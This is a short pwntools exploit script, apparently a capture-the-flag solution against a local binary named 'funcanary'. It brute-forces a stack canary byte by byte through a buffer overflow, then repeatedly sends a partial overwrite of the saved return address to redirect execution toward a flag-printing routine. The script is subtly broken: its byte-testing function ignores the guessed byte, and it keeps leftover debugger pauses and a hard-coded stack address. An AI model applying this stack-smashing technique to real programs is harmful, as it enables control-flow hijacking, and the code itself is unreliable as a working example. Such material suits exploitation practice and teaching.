from pwn import *
import time
# context.log_level = 'debug'
p=process('./funcanary')
gdb.attach(p)
pause()
# p=remote('47.95.212.224',)
# elf=ELF('./funcanary')
context.arch='amd64'
timeout=0.03
canary=b'\x00'
def test(mybyte):
    # print('in',mybyte)
    p.recvuntil(b'welcome\n')
    payload=b'a'*0x68+canary
    # gdb.attach(p)
    # gdb.attach(p,'b *$rebase(0x00000000000012BB)')
    pause()
    p.send(payload)
    recv=p.recvuntil(b'have fun\n',timeout=timeout)
    if b'have fun\n' in recv:
        return True
    else:
        return False
# back=0x000000000001231
for j in range(7):
    for i in range(0x100):
        if test(p8(i)):
            canary+=p8(i)
            print('add',hex(i))
            break
print('canary',hex(u64(canary)))
context.log_level = 'debug'
while 1:
    payload=b'a'*0x68+canary+p64(0x7fffffffdde0)+p8(0x28)+p8(0x12)
    p.recvuntil(b'welcome\n')
    # gdb.attach(p,'b *$rebase(0x00000000000012B6)')
    # pause()
    p.send(payload)
    re=p.recvuntil(b'flag',timeout=timeout)
    if b'flag' in re:
        print("success",p.recv())
# p.recvuntil(b'welcome\n')
# payload=b'a'*0x68+canary+p64(0x0000000000400D83)